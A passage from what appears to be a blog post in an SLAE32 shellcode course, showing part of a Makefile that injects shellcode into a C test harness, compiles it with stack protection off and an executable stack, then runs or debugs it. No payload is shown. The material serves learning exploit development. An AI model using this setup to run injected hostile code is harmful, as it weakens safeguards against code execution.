	@sed 's/CODE/$(shell cat tmp.txt)/' $(TEMPFILE).c > $(TEST).c
	@rm -f $(TEST)
	gcc -fno-stack-protector -z execstack $(TEST).c -o $(TEST)
	@rm -f tmp.txt
	@rm -f $(TEST).c
	@rm -f $(TEMPFILE).c
	@echo

run-shellcode: ## Run the shellcode.
	@echo -e '[*] Running $(TEST)...'
	./$(TEST)

debug-shellcode: ## Debug the shellcode.
	@echo -e '[*] Debugging $(TEST)...'
	gdb -q ./$(TEST)

clean-shellcode: ## Clean up the compiled shellcode.
	@echo -e '[*] Cleanup $(TEST).*'
	rm -f $(TEST)

help: ## Show this help.
	@echo -e '# Usage: make [option]\n'
	@echo -e '# option:'
	@fgrep -h "##" Makefile | sed -e 's/\(\:.*\#\#\)/\:\ /' | fgrep -v fgrep | sed -e 's/\\$$//' \
    | sed -e 's/##//' | column -t -s:
{% endhighlight %}

{% include_relative slae32.html %}

## Reference

- [X86 Assembly/Interfacing with Linux](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux)
 